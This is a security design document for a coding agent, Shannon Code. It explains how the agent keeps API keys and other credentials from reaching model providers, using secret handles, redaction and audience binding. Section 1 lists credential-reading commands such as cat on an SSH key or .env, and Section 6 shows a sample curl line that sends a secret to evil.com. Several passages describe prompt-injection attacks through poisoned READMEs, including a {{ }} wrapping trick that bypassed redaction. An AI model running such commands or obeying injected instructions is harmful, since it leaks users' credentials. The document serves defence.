*secrets.txt*   Keeping credentials off the wire, and out of everyone's logs

                     SHANNON CODE — SECRETS & EXFILTRATION

A credential that reaches a model provider is gone: it is in a request body, a
retention window, possibly a training set, and certainly somewhere we do not
control. This document is how Shannon stops that — and, where it cannot stop it,
how it makes the exposure **visible and deliberate** instead of silent.

STATUS: P1, P2, P3 and the P3a generalization are BUILT (2026-07-25/26).
P4 (audience binding) is open. Prompted by reviewer E's finding that tool
children inherited `ANTHROPIC_API_KEY` (fixed, `01776cf`) and that read-only
commands auto-run.

Read §3a first: it is the general model the earlier sections are special cases
of, and it was arrived at *after* them. §3 is kept because the hold/don't-hold
split is still load-bearing, not because it is the top of the hierarchy.

==============================================================================
1. THE PROBLEM, STATED HONESTLY                                *secrets-why*

Shannon runs shell commands and sends their output to a model provider. That
makes **read-only the dangerous class**, which is the opposite of the intuition
the permission engine was built on:

>
    cat ~/.ssh/id_ed25519      # read-only. Harmless to the machine.
    cat .env                   # read-only. Harmless to the machine.
    env                        # read-only. Harmless to the machine.
<
Every one of those is `Effect::ReadOnly`, which today means **auto-run: no
pane, no keypress** — and the output goes to the API *and* to our own on-disk
episode log. Nothing is damaged locally; the secret simply leaves.

**The adversary is not the model.** It is *prompt injection through tool
output*: we feed command output back into the model by design, so a poisoned
README, a crafted issue, or a dependency's changelog can carry instructions. The
model need not be malicious, only **manipulable** — and then it reaches for the
one command class that never asks.

We are not assuming a provider is hostile. This is exposure minimisation: a
secret that never leaves cannot be mishandled by anyone, including us.

==============================================================================
2. WHAT OTHERS DO                                             *secrets-prior-art*

- **Presidio** (Microsoft) — the anonymize → LLM → deanonymize "PII proxy"
  pattern. Instructive detail: **only its `encrypt` operator is reversible**;
  masking/hashing/redaction are one-way *by design*. A reversible mapping is a
  thing you build deliberately; it does not fall out of redaction.
- **1Password `op run` / `op://`** — the *reference* lives in the file, the
  value is resolved into process memory at exec and dies with the process. The
  model sees a name; the runtime sees the value.
- **"Zero Token Architecture"** — the agent-facing form: hand the agent a
  placeholder, let a boundary swap in the real credential on the way out.
- **What fails.** Knostic found Claude Code auto-loads `.env`/`.env.local`
  without consent; Cursor attempted to upload a local file with a key swept in.
  Their verdict on the standard mitigation is the important part: deny rules are
  *"not guaranteed"*, because agents are *"probabilistic systems [that] cannot be
  trusted to reliably enforce policy boundaries."*

**That last critique does not land on us, and it is why this is worth building.**
A `.claudeignore` line is an instruction the model may ignore; our gate is
deterministic Rust *outside* the model, on the path the command must take. Steven
runs a hand-written directive at work ("look at `.env` keys, never values, never
auto-run against it") — this document is that directive **made unignorable**.

==============================================================================
3. TWO PROBLEMS THAT LOOK LIKE ONE                            *secrets-split*

Conflating these leaves a hole exactly where we believe we are covered.

**A — secrets we HOLD.** Our API key; a configured vault; `.env` values we
chose to read. We own the mapping, so substitution is exact and reversible.
Solved by tokenisation (§4).

**B — secrets we DON'T hold.** Arbitrary output of an arbitrary command. You
cannot replace what you cannot find, so this reduces to *detection* — patterns
and entropy, in the gitleaks/trufflehog tradition — which has false negatives by
construction. Solved, partially, by egress redaction (§5).

Neither subsumes the other. A: exact, complete, narrow. B: fuzzy, incomplete,
broad.

==============================================================================
3a. THE GENERAL SHAPE (arrived at second)                     *secrets-model*

P1–P3 were built from examples: API keys, `.env`, `~/.ssh`. Starting from
examples is right — Polya's whole method is to understand the special case
first. **Stopping there is not.** A design that never generalises ships a tool
that handles the cases its author happened to think of, and quietly fails
everyone whose situation differs. Steven, 2026-07-26: *"when you are aiming for
specific examples you end up missing the simpler solutions that handle more."*

The general statement:

>
    Everything crossing the machine/wire boundary passes through one
    SUBSTITUTION TABLE. Outbound, local values become names.
    Inbound, names become local values.
<
Redaction, tokenisation, and `.env` masking are not three mechanisms. They are
one mechanism at three settings of **four independent axes**:

    RECOGNITION   how a span is found       literal · issuer prefix · entropy ·
                                            name-directed · path · (regex)
    ACTION        what replaces it          a kind label · a stable name
    REVERSIBLE    can it come back?         no, we never held it · yes, we do
    SENSITIVE     is spending it dangerous? gate stops it · expands freely

Redaction is then a corner of the space, not a separate thing: *an alias with no
reverse and a generated label.*

**The axis that was missing is SENSITIVE**, and folding it into "is it an alias"
is what kept the whole design stuck on credentials. Separate them and the same
machinery covers three needs at once:

    need            example                          sensitive?  why alias it
    ────────────────────────────────────────────────────────────────────────
    credentials     GITHUB_TOKEN                     yes         must not be seen
    privacy         /home/sam, hostnames, the        no          not our business
                    program names in `ps` output                 to ship upstream
    token economy   a 60-char repo path appearing    no          it is expensive
                    400 times in a build log                     to repeat

The third is not a bonus — it is the argument that the mechanism is *right*. A
substitution that saves tokens and protects privacy with the same code, and
needs no security justification to be worth having, is a sign the abstraction
found the real joint. It also means the privacy default costs the user nothing,
which is how a privacy default survives contact with someone in a hurry.

**Sensitivity is what gates, and nothing else.** A secret alias faces a human,
defeats `allow`, and refuses when unknown. A path alias expands silently,
because expanding it grants no authority the machine did not already have — the
resulting command still meets the ordinary permission gate on its own effect.
Gating path aliases would be the "prompt that trains dismissal" failure, applied
to the one mechanism whose value depends on being invisible.

**Corollary — the nonce belongs exactly where the capability is.** Sensitive
handles carry a session nonce so an injected instruction cannot construct one
blind (§4). Non-sensitive handles must NOT: there is no capability to protect,
and a guessable `{{alias:repo}}` is one a human can type. *Unguessable where it
grants something; memorable where it does not.*

**The rule for WHEN an entry resolves: expand at the gate exactly what a human
cannot read, and nothing else.** This is sharper than the "plain at the gate,
secrets at exec" split it replaces, and it decides all three cases:

- a **minted handle** (`{{alias:repo}}`) means nothing without us, so it resolves
  at the **GATE** — the pane then shows a command whose every part means
  something to the person approving it, and an alias cannot launder a path past a
  path-scoped `deny`;
- a **secret** must never be displayed at all, so it resolves at **EXEC**;
- a **canonical form** (`~`) is universally legible, so it resolves at **EXEC**
  too — expanding it for display would trade a short portable path for a long
  machine-specific one and buy the reader nothing.

Note where the seam falls: not between "secret" and "not secret", but between
**what the reader needs expanded and what they do not**. Two very different kinds
land on the same side, which is usually the sign a rule is carved at the joint.

**So "when it resolves" is its own axis** (`ResolveAt` in code), not a synonym
for sensitivity. Keying the code on sensitivity instead is what forced `~` into a
bolted-on second pass, and every future recognition mode — interned detections,
entropy-aliased noise — would have added another. `~` is the entry that
disagrees: not sensitive, and still resolved late.

**The one alias shipped ON: `$HOME` → `~`.** Every other default here is
conservative, and this one is not, because the argument for it is not primarily
about security. Steven, 2026-07-26: *"I think `$HOME` is worth the aliasing. It
makes it portable. Using a full path name does more harm than good."*

That reframes it, and the reframe is the point. An absolute
`/home/sam/proj/src/a.rs` is **machine-specific and true nowhere else**;
sending it teaches the model a fact that does not travel, and a model reasoning
from it will write paths that work on exactly one computer. `~` is what a
portable path *is*, to every shell and every model. So this is not a privacy
feature with a portability side effect — it is a **correctness** fix, and
privacy (the username stops travelling) plus token economy come along free.
Three wins from one substitution is the §3a test for a real joint, passed again.

`~` is also **not a minted handle**: it is a canonical form that already exists.
That distinction is load-bearing. A minted `{{alias:repo}}` must be resolved by
us because nothing else can; `~` is understood by the shell itself. We resolve
it anyway, in both directions, for one reason worth stating plainly: **our own
masking is what puts `~` in front of the model**, and a path copied back inside
quotes (`cat "~/My Documents/x"`) would *not* expand in bash. Repairing a hazard
we introduced is not optional.

Because `~` is shell syntax, it gets the shell's rules rather than the generic
word-boundary test — `~root` is a different user's home (never guessed at), `=~`
is bash's regex-match operator, and `backup~` is an editor leftover. All three
are left alone, and those are the cases the tests are built around.

**Why this is exposed rather than hidden.** Steven, 2026-07-26: *"this is an
important part of why we want to expose everything to people, so they can
investigate, improve, and know what data is being moved and where."* A
substitution table is the one place that can answer "what is actually leaving
this machine". Hiding it would waste the best observability surface in the
program, so it is listable (`:alias`), every substitution is reported, and
users add their own. Defaults stay conservative — the general mechanism is for
power users, per [[feedback_sane_defaults_rings]] — but the ceiling is theirs,
not ours.

==============================================================================
3c. COMPRESSION AND SECRECY ARE ONE MEASUREMENT              *secrets-entropy*

Steven, 2026-07-26: *"compression and encryption go hand in hand… `PASSWORD=
hunter2AllISeeIs*****` is really long and the actual result is that it is noise
to the model. It isn't meaningful data. By substituting it we've also compressed
the statement and saved on tokens. It is a true win-win."*

**This is not a convergence we noticed. It is one subject.** (Steven, 2026-07-26,
correcting an earlier draft of this section that undersold it.) Compression and
secrecy are not two techniques that happen to help each other — they are two
statements about the same quantity, which is why the project is named after the
man who wrote both *A Mathematical Theory of Communication* and *Communication
Theory of Secrecy Systems*:

>
    COMPRESSION  maximise the information carried per symbol —
                 drive the representation down toward H(X).
    SECRECY      make the observer unable to gain information —
                 drive H(M | C) back up to H(M).
<
**Both are stated against the same quantity, `H(X)`, and neither is the other's
inverse.** An earlier draft here called them "the same measurement read from
different ends" — wrong, because "different ends" implies one axis with a
trade-off along it, and there is no such axis. The demonstration is a
decompression: take a maximally compressed message and pad it back out. You have
added *symbols*; you have added no *information*. **Redundancy is not
information**, so representation length and information content are different
things, and only the second is entropy.

Which is why the two are **independent, not opposed**. All four combinations
exist — compressed-and-secret, compressed-and-public, uncompressed-and-secret,
uncompressed-and-public — and a ciphertext may or may not *also* be maximally
compressed, which is exactly the gap the compression-oracle attacks live in
(below). Related, never in contention: you never trade one away to get the other.

The tell that they are one subject rather than one dial: **both drive their
output toward indistinguishable-from-random** — optimally compressed text has no
redundancy left, and good ciphertext must have none to exploit. That is why
compression comes *before* encryption in every serious protocol.

And the word is shared with thermodynamics for the same reason, not by analogy:
Gibbs' `S = -k_B Σ p ln p` and Shannon's `H = -Σ p log p` are the same functional
form over the same object — a probability distribution's uncertainty. (Von
Neumann's advice to Shannon on what to call it is the well-known story;
Landauer's principle, that erasing a bit costs `kT ln 2`, is the part that makes
the identity physical rather than notational.)

For our purposes the consequence is the operational one:

>
    Compression removes what the receiver can PREDICT or does not NEED.
    Confidentiality removes what the receiver SHOULD NOT HAVE.
    The overlap — high entropy, low task-relevance — is exactly a secret.
<
A credential is the **extremal point of that space**: maximum bits, minimum
meaning. So it is simultaneously the most expensive thing to transmit per unit
of usefulness *and* the most dangerous — **two independent reasons not to send
it, which happen to be maximal at the same point.** That is why removing it wins
twice, and why the win-win was never a lucky pairing to be grateful for: it is
what the theory says has to happen.

**This is a design principle, not a piece of trivia.** It is the reason a
mechanism built for one of the two keeps paying off in the other, and the reason
to look for that shape deliberately: when a change is worth making for a reason
*unrelated* to the one that motivated it, the abstraction is probably sitting on
something real.

**The known hazard of combining them, and why ours is much smaller than it
first looks.** Compression *oracles* (CRIME, BREACH) leak plaintext because the
compressed length is a function of the content: an attacker who can influence the
input and observe the size learns whether their guess matched, one byte at a
time.

The bite comes from *generality*. A real compressor finds **arbitrary** repeated
substrings, so an attacker can inject a guess and watch it collapse against the
secret. **Our substitution is not a general compressor**: it replaces a
**closed set of values we already hold** with **fixed-length** handles. The most
an observer can learn is "one of the values already in the table appeared, this
many times" — and to interpret that at all they must already know the value.
There is no byte-at-a-time escalation, because there is nothing content-driven to
escalate through. It also needs an attacker who can see our token counts, which
is account-level access; anyone holding that has better options.

**Where it would become real: entropy-aliasing** (§3c's third row, docketed).
Substituting *arbitrary* high-entropy runs found in output is content-driven and
much closer to a general compressor, so it must not ship without redoing this
analysis. Recorded as a gate on that feature rather than as a worry about this
one — which is the useful form for a hazard whose preconditions we control.

**Measured, and the numbers are better than character counts suggest.** BPE
tokenizers compress predictable text well and random text badly, so the very
property that makes a secret worth hiding also makes it worth ~2 characters per
token instead of ~4. (Estimates — we have no tokenizer in-tree — but the
direction is structural, not a guess.)

    what                                            chars    est. tokens
    ────────────────────────────────────────────────────────────────────
    a 44-char random secret                            44           22
      → `[redacted: high-entropy string]`              31            8
    /Users/jordan/Development/projects/apps/src        43           14
      → `~/Development/projects/apps/src`              31           10
      → `{{alias:repo}}/src`                           18            4

Characters say substitution is a wash; **tokens say it is roughly 3× on the
secret path**, because we replace maximum-entropy bytes with ordinary English.
The win-win is real and it is larger than it looks.

**The criterion this yields** — and it is the answer to "what else deserves an
alias", which no amount of staring at credentials was going to produce:

>
    worth aliasing  ∝  (token cost × repetition) ÷ task relevance
<
    credential          high cost, ZERO relevance          always
    $HOME               moderate cost, high repetition     by default (§3a)
    UUIDs, git SHAs,    high cost (random!), low relevance  THE UNEXPLOITED
    build ids, lockfile  often repeated                     CORNER
    hashes, base64 blobs
    source code         high cost, HIGH relevance          never

The `$HOME` decision falls out of this independently, which is a good sign for
the criterion. The third row is the part we have not built: content that is pure
token waste with **no security stake at all**. That a mechanism built for
secrecy pays off with the security argument entirely removed is the strongest
evidence yet that §3a found the real joint.

**And it names what we built.** A substitution table applied to repeated values
is a **dictionary coder** — LZ77's back-reference, wearing a security hat.
Interning a repeated value is emitting a back-reference to it. We did not add
compression to a security feature; the two were the same feature all along.

**What blocks the third row: a fifth axis, WHICH SINKS.** Secret masking is
applied at *capture*, so the wire, the transcript and the store all read the one
scrubbed string — deliberately, so no path can see cleartext. A *compression*
alias wants the opposite: mask the wire, leave the transcript alone, because a
human staring at `{{ref:h1}}` where their terminal should show a git SHA is
strictly worse off. So §3a's four axes are four of five, and the fifth has to
land before entropy-aliasing can be turned on. Docketed, not built.

**The cost we already pay, quantified.** Of the ~8 estimated tokens in
`{{secret:github-token.4f19ac30}}`, about **half is the nonce** — because the
nonce is the one deliberately-random part, and randomness is what tokenizes
worst. Our unguessability is bought in exactly the currency this mechanism
exists to save. 32 bits is more than the threat needs (a blind guess produces a
*visible refusal*, and there is no oracle to iterate against); 16 bits would
halve the cost. Left at 32 pending a decision, because trading entropy for
tokens is a judgement about risk appetite, not an optimisation to make quietly.

==============================================================================
3b. RECOGNITION IS FORMAT-INDEPENDENT                        *secrets-formats*

The obvious worry: `.env` is `NAME=value`, but YAML is `key: value`, `.netrc` is
whitespace-positional, `.pgpass` is colon-positional, XML is `<tag>value</tag>`,
and some formats use several at once. Do we need a parser per format, or a
configurable delimiter set?

**Neither — and the reason is worth stating, because we nearly built both.** The
scrubber tokenises on "characters credential formats actually use"
(`alnum _ - . + ~`). Every delimiter any of those formats uses — `=`, `:`, `"`,
`<`, `>`, whitespace, `,` — is *already* a boundary. Verified, not assumed:

>
    ANTHROPIC_API_KEY=sk-…    →  ANTHROPIC_API_KEY=[redacted: anthropic key]
    api_key: sk-…             →  api_key: [redacted: anthropic key]
    "api_key": "sk-…"         →  "api_key": "[redacted: anthropic key]"
    machine x login me password sk-…
                              →  … password [redacted: anthropic key]
    localhost:5432:db:user:sk-…
                              →  localhost:5432:db:user:[redacted: …]
    <apiKey>sk-…</apiKey>     →  <apiKey>[redacted: …]</apiKey>
<
So "keys visible, values masked" was never an `.env` feature; it is what
tokenising does, in every format, and the earlier doc calling `=` a special case
was the mistake. **The general solution was already there and was described as a
specific one.**

The real gap the probe exposed is orthogonal to format:

>
    password: hunter2seekrit   →  password: hunter2seekrit   (unchanged!)
<
`hunter2seekrit` matches no issuer prefix and is not high-entropy. It survives
in *every* format, so a per-format parser would not have helped at all. What
identifies it is not its shape but **its neighbour**: the name in front of it
says what it is.

Hence **name-directed masking**: if the preceding token's name means "a
credential follows", mask the value whatever its shape. Two guards keep it from
eating prose:

1. **Segment-suffix matching, not substring.** `ANTHROPIC_API_KEY` splits to
   `[anthropic, api, key]`; the hint `api-key` matches as a suffix. Substring
   matching would make `tokenizer: gpt2` mask `gpt2` (`tokenizer` contains
   `token`) — a false positive that lands squarely in this user's own work.
2. **A delimiter must sit between name and value**, and never a newline.
   `password: x` and `password=x` qualify; the prose "the password is stored in
   Vault" does not, because `is` follows a bare space. `.netrc`'s
   `password hunter2` needs whitespace to count, so the delimiter set is the
   knob — the one place where per-format configuration genuinely earns its
   keep, rather than the parser we almost wrote.

Both the hint list and the delimiter set are seeds plus config, like every other
list here.

==============================================================================
4. TOKENISATION — the model uses a secret without seeing it   *secrets-tokens*

A value we hold is never sent. In its place goes an opaque handle:

>
    DATABASE_URL={{secret:db-url.4f19ac30}}
    ...model reasons about the handle, never the value...
    psql "{{secret:db-url.4f19ac30}}" -c '\dt'   ← the model proposes this
    psql "postgres://real..." -c '\dt'           ← what runs, after the gate
<
Secrets are lent deliberately, by name — `[secrets] env = ["DATABASE_URL"]`, or
an `[[alias]]` entry with `env` — and the default is an empty table: a secret is
never borrowed just because it happened to be in the environment. **The variable
itself is handed to no command** (`Aliases::lent_vars`): Shannon's own start
from the minimal set, `[exec] env` may not name or expand one, and `claude`,
which otherwise passes its whole environment to Claude Code's Bash, is started
without them — before 10-31 it was not, and `echo $GITHUB_TOKEN` read the value
the handle exists to hide (review stop 14, Reviewer E F1). This is the
**sensitive** corner of §3a; the non-sensitive corner is the plain
`{{alias:repo}}`, which carries no nonce and does not gate.

Properties that matter:

- **Stable within a session.** The same secret gets the same handle, or the
  model's reasoning fragments. The nonce is *derived* — `blake3(session seed ‖
  label)` — so stability is free and no per-entry state is stored.
- **Opaque, not guessable.** The handle namespace is a **capability
  namespace**. The threat is concrete: the adversary is prompt injection through
  tool output, and that attacker cannot see this session. With predictable
  handles they could write `{{secret:github-token}}` blind into a poisoned
  README and have it resolve; with a per-session nonce they cannot construct one
  at all.
- **Both audiences are told.** The user sees a notice on every spend, plus
  `:secrets` to list what is lent; the *model* is told the handles exist (in the
  tool definition — a model that is not told cannot spend at all) and told in the
  tool result when a substitution happened. Otherwise it reasons about the
  literal placeholder and draws confident wrong conclusions — the message-honesty
  rule, pointed at the model.
- **Expansion is an event.** Every expansion is logged at the audit level and
  surfaced in the transcript. A secret being spent is never quiet.
- **A file tool spends one too** (S21-Q27, 11-03; `file-tools.md` §7). A
  handle in a Write's content or an Edit's `new_string` is a hard ask — the
  spend said in the line the gate judges — and its value goes into the file
  at the run (`Aliases::put_in_file`: the secret pass, none of the shell's
  rules). The case it is for: the model reads a file whose value comes back
  as its handle and writes the file back — "the agent doesn't necessarily
  know that that's the secret" (Steven), and the file must keep the value.
- **A handle in a line defeats an `allow` rule.** Same shape as the
  disturbed-bindings exception: the line that runs is not the line the rule
  described. Without this, `allow curl *` is a standing permission to exfiltrate
  (§6, rule 4).
- **An unknown handle refuses the command.** *Changed 2026-07-26, during P3.*
  The sketch above had it "expand to nothing and raise a finding" — but an empty
  expansion turns `rm -rf {{secret:x}}/` into `rm -rf /`. An unresolvable handle
  is a mistake or an injection; neither should run, and neither should be
  silently rewritten into something else.

What the transcript keeps is the **handle form**. The cleartext exists only in
the argument handed to the shell, so no log line, episode file, or `tool_result`
can carry it.

Honest limit: that argument is visible in `ps` to other processes of the same
user for the duration of the run. Injecting through the environment instead would
hide it there, but would silently fail whenever the handle sits inside single
quotes — a wrong-behaviour trap traded for a same-user disclosure. Docketed as a
hardening variant, not pretended away.

==============================================================================
5. EGRESS REDACTION — the net under everything else           *secrets-redact*

Before command output becomes a `tool_result` **or reaches the store**, scan for
credential shapes and replace with `[redacted: <kind>]`:

    sk-ant-…  ·  ghp_/gho_/github_pat_  ·  AKIA…  ·  xox[baprs]-
    -----BEGIN … PRIVATE KEY-----  ·  bearer tokens  ·  high-entropy runs

Redaction is **one-way** (per Presidio's lesson — do not conflate it with §4's
reversible mapping) and is applied on *both* sinks: a key redacted from the wire
but written to our episode log is still a key on disk, in a file that outlives
the session.

**The model's own calls too** (11-08). A call the model makes is kept scrubbed
as it arrives — what the transcript holds, the store writes and every later
request re-sends — through the door Claude Code's recorded calls take
(`App::keep_tool_use`); it runs as the model typed it. The outbound door masks
only the values Shannon holds, so until then a credential's shape the model
typed went back with each request and sat in the store, on the API path alone.
Scrubbed on arrival, never later: a thinking block is bound to what came before
it, and every later one is written over the scrubbed form. Shannon's model sees
only scrubbed text, so this mostly finds a value typed before it was marked, or
one the model put together itself. Two things stay as the model wrote them:
its thinking, which goes back unchanged, and its reply's text, so that a held
value it wrote itself is drawn apart on replay (`ui.secret.leaked`); the door
masks that one on the wire. A credential's shape in the reply's text is still
kept in clear (docketed).

It is a net, not a wall: false negatives are certain. It exists to catch the
case §4 cannot know about — a build log that happens to print a token.

**What the net promises**, stated so the boundary is testable rather than
vibes-based. Each line is a property test over adversarial input, because
*"what is our unexpected input is someone else's expected"* (Steven,
2026-07-26) and command output is arbitrary bytes from an arbitrary program:

- A credential **beginning at a token boundary** is removed, wherever it sits and
  whatever surrounds it — including inside text shaped like our own output.
- Recognition is **format-independent** (§3b): the boundary may be `=`, `:`,
  whitespace, a quote, a tag, or a run of dashes.
- Scrubbing is **idempotent**. Not decoration: `audit()` scrubs a report whose
  output was already scrubbed at capture, so a non-idempotent pass degrades real
  transcripts. It did — `password: [redacted: named secret]` became
  `password: [[redacted: named secret]: named secret]`, worse on every pass.
- Text carrying no credential comes back **byte-identical**.

**What it does not promise**, deliberately: a credential *without* a published
checksum, glued to a word with **no separator at all** —
`prefixAKIAIOSFODNN7EXAMPLE` — is missed. (One *with* a checksum is now caught
there, which is the point of the paragraph below.) This is a known limitation of
the whole field, not a gap peculiar to us: gitleaks' rule anatomy is
`identifier … assignment … secret-body`, so it misses the same shape.
The field's other answer is TruffleHog-style **verification** against the
issuer's live API, which is not open to us — that is itself egress, and it would
*spend* the credential in order to test it.

What we *did* take from the field is how it keeps precision while matching a
body that is not at the start: gitleaks pairs every prefix with a **character
class and a length** (`[a-z0-9_-]{32}`), so the body must *look like* key
material rather than merely be long. Our version: a prefix must sit at a
**sub-token boundary** (regex `\b` semantics — start, or after a separator),
and when it is not at the token start we require **more evidence** — a digit in
the trailing run. That is what separates `PLANTEDVALUE0123` from
`directory-name` and `PACIFIC-REGION`, and asking for the extra evidence only
where the risk is means the token-start case is unchanged.

Convergence with the field, which is reassurance rather than novelty: gitleaks'
*identifier* half is what we arrived at as **name-directed masking** (§3b), and a
newer scanner replaces Shannon entropy with a **byte-pair-encoding
token-efficiency** signal to tell a UUID from a credential — the same
compressibility measurement §3c describes. Several people reading the same
theory land in the same place; that is what a correct theory does.

**Plugged, for issuers who published a checksum.** Several build one into the
token *precisely so scanners can validate offline*.
GitHub's format is `ghp_` + 30 characters of entropy + **6 characters of
base62-encoded CRC32** over that entropy — 40 characters total — and the GitHub
engineering post says the reason is exactly this: let a scanner confirm a
candidate is structurally real before acting on it.

That changes the trade completely. The only thing forcing us to anchor at a
boundary is the false-positive cost of matching anywhere; a checksum removes that
cost, because a random 40-character run passes CRC32 with probability about
`1/62⁶` (~1 in 5·10¹⁰). So for any issuer with a published checksum we can scan
at **any offset**, validate, and accept — high recall *and* near-zero false
positives, with no network and nothing spent. It is TruffleHog's verification
idea with the verification done locally.

Shipped as `secrets/format.rs`: each `Shape` carries a prefix, a `kind`, a
**minimum body length**, and an optional validator. A checksum licenses matching
at any offset; formats without one keep the boundary-and-digit heuristics.

**The checksum is ADDITIVE, never a replacement**, and the existing tests caught
the first draft getting this wrong. Making it exclusive meant a *truncated* token
— our own output cap can produce one — or one with a typo failed its checksum and
stopped being redacted at all. A partial credential is still sensitive; it
narrows a search space. So a check may only ever turn a miss into a catch.

**Per-issuer length, found the hard way.** A property test generated
`hf_00aa_aaa-a00` and it was being redacted, because a *global* 12-character
floor made `hf_` plus twelve characters a HuggingFace token — so
`hf_model_config-v2`, an ordinary filename in any ML repository, was getting
shredded. Each shape now carries the minimum its real format can have. That is
gitleaks' "pair every prefix with a length" rule, arrived at by being caught out
rather than by reading it first.

This is the net; the walls are §4 (exact, reversible) and §7 (before the read).
The limit has a named test, and it has already earned its keep: it failed the
moment the separator case was fixed, which is exactly what a limit test is for.

**Measured, 2026-09-24, after the net was found shredding ordinary text.**
Steven ran `find . -name "*.md"`; two of this repo's own `SECURITY-*.md`
filenames came back redacted, and the model then answered "list all md files"
with a list short by two that nobody could see was short.

**Credit where it belongs:** that specific symptom was closed by the previous
commit's `ENTROPY_BITS` 3.5 → 4.5, not by anything below. Reproduced by probe —
at 3.5 the listing really does read `./docs/DesignDocs/[redacted: high-entropy
string]`, at 4.5 it is clean — and pinned by
`a_find_listing_of_this_repo_survives`. It is recorded here because the fix is a
*number*, so it un-fixes itself the moment someone turns the dial down, and
because the investigation it triggered found the larger problem.

That larger problem: the name-directed rule turned `let token = &argv[i];`
into `let token = &[redacted: named secret][i];` — **1 line in 677** of this
repo's Rust, 1 in 333 of its prose, because `=`/`:`/`>` are ordinary syntax and
`token`/`secret`/`pass` are ordinary identifiers.

Three numbers now govern the net, each measured rather than chosen:

- **A value floor for the name rule** (`name_min_value`, 12). The name alone is
  not evidence; the value must look like one. Removes ~95% of those false
  positives — down to about five across 110k lines.

  **Where the context binds a credential, there is no floor** (11-08). Steven
  questioned what the floor gave up — "I'm not sure we should assume short
  passwords aren't real passwords" — and decided: what matters is when
  something is *obviously* a password, "to the degree we can". Two contexts
  say so (`context_names_a_value`): an assignment with no spaces to an
  environment-style name or a flag (`PGPASSWORD=hunter2`, `export
  DB_PASSWORD=hunter2`, `--password=hunter2` — how a shell, a `.env` and a
  command line bind values, and not how formatted code or Python's keyword
  arguments are spelled), and a quoted value bound by one `=`, `:` or `>` to
  a password's name (`password = "hunter2"`, `"passwd": "hunter2"`, and a
  JSON value under such a key). Names grew to match: a credential's name
  glued to its owner in the environment's spelling (`PGPASSWORD`,
  `CLIENTSECRET`; five letters at least, so `BYPASS` is not), `SSHPASS`, and
  `pwd` after a qualifier only (`MYSQL_PWD`; alone it is the working
  directory). Measured over this repository's 337k tracked lines (`secrets/`'s
  fixtures and Steven's drafts excluded): 17 new lines, every one an
  assignment or flag holding a fake credential in a test or a doc, none
  lost. Quoting alone was measured first and was too wide: nine more lines,
  seven of them code and config — `token == "--"`, `secret = "redact"`, a
  match arm `Secret => "…"` — and two fake credentials under a name that is
  not a password's (`let secret = "…"`, `"api_key": "…"`), now spared. Over this machine's 101 environment names (names only, fake
  values): three taken, two of them credentials, the third a session key
  the floor already took by its length. Still given up: a short value where
  the text could be code — `password: hunter2`, unquoted, as YAML or prose
  writes it.

  **The first version measured the wrong thing, and review caught it.** It
  measured the *token*, and a token ends at any punctuation — so
  `password: hunter2!Xk7pQ2mZ9vLab` reached the floor as `hunter2`, was spared,
  and a twenty-character password went out whole with no marker. Reviewers A
  and B reproduced it independently. The same unit was an older leak too:
  before the floor, only the first fragment was ever redacted. The value is now
  taken **whole** (`named_value_end`): to the closing quote if quoted, else to
  whitespace or code syntax (`()[]{}<>;,:`), and measured and redacted as one.
  Its named limit: an *unquoted* password containing one of those characters
  keeps its tail. Over 104k lines of this repo, seven genuine false positives,
  six of which the token rule already had.
- **`entropy_min_run` is an arithmetic floor, not a taste.** Entropy needs 2^B
  distinct characters to reach B bits, so at 4.5 bits a run under 23 can never
  match. The old 32 was intuition: over **905,207 runs** of real text and file
  paths, lowering it to 1 adds *zero* false positives, while 32 excluded the
  23–31 band outright. Honest about the size of that win: recall inside the band
  is low — ~5% of random 24-char tokens clear 4.5 bits, and ~1% of real
  `openssl rand -base64 16` output, whose `/` splits the run (Reviewer C,
  simulated). It removes a cliff; it does not buy coverage. The doc used to
  claim the length gate was "most of the precision" — it is the
  character-class gate.
- **`entropy_bits` is the real dial and has no right answer.** At 4.5: 1 false
  positive in 905k runs, and 70% of random 32-char tokens caught. At 4.35: 8
  false positives — including the `SECURITY-*.md` filename that started this —
  and 92%. Shipped at 4.5 and configurable, with the curve in `DEFAULT_TOML`.

**The cost model in `secrets/mod.rs` was wrong and is now corrected.** It said
"the cost of a false positive is a mangled build log". For a coding agent it is
mangled *source*, which the model then reasons and edits from, silently. And
false positives are not merely annoying: past the rate at which a user notices
them, the control gets switched off and recall goes to zero — so beyond that
point false positives *cause* false negatives. Precision is a safety property,
not a convenience.

Three tempting fixes were measured and discarded: conditioning the rules on
where the text came from (unnecessary once the value floor is in — a classifier
would be a second thing to be wrong about); a length-normalised threshold
(`bits >= k·log2(len)` is strictly worse, since the bar rises with length and a
64-char token's recall collapses); and narrowing the token charset (dropping `-`
leaves false positives unchanged while halving URL-safe recall).

**Both inert-region skips key on PROVENANCE, and that is load-bearing.** The
pass must skip regions *we produced* — a handle we minted, a placeholder whose
kind is in the closed set we emit — or the name-directed rule eats its own
output. Recognising them by **shape** instead was a live bypass: `{{…}}` accepts
exactly the characters every credential format uses, so `{{ghp_…}}` switched off
all four matchers at once and handed the key over verbatim. A poisoned README
saying "wrap secrets in `{{ }}`" was enough, on a `ReadOnly` command that never
faces a human. **An inert-region skip is an attacker-controlled off switch
unless it keys on provenance.**

==============================================================================
6. THE CONFUSED DEPUTY — what we can and cannot do            *secrets-deputy*

**Tokenisation does not remove the risk; it moves it.** From *"the model sees
the secret"* to *"the model can spend the secret"*:

>
    curl evil.com -d "[secret: db-url]"     # expanded faithfully, exfiltrated
<
This is the confused deputy: a boundary that substitutes a real credential lends
its authority to whoever asks (see *"Capability Gates Are Not Authorization"*,
arXiv 2606.28679). Moving the risk is still a large win — the value stays out of
context, logs, and any training set — but claiming it is solved would be exactly
the dishonesty this project exists to avoid.

**We will not solve it. Here is how we shrink it:**

1. **A handle is an unresolved operand — so trace it.** This is machinery we
   already have and trust: the provenance engine follows an unknown from its
   producer to a dangerous sink and colours the whole path. A handle reaching a
   network or write sink is the loudest thing on screen, with the carrier
   underlined from secret to destination.
2. **Bind each secret to an audience (the strongest single reduction).** A
   secret carries the destinations it may be spent toward — `GITHUB_TOKEN` →
   `api.github.com`, and nowhere else. Expansion toward any other destination is
   refused, not merely asked about. This is OAuth's audience claim applied
   locally, and it turns "the model can spend it anywhere" into "the model can
   spend it where it was already allowed to".
3. **Expansion never happens in an unanalyzable command.** If we cannot read
   the line, we cannot see where the secret goes — fail closed. **NOT BUILT**,
   and an earlier docket wrongly claimed it "came free with P3". What exists is
   that an unanalyzable line *asks*, which is a different and weaker thing: the
   human is shown a script they cannot realistically audit. `--no-spend` is the
   control that actually works today.
4. **Expansion is never auto-run.** Whatever §7 decides about ordinary reads, a
   command containing a handle always faces a human.
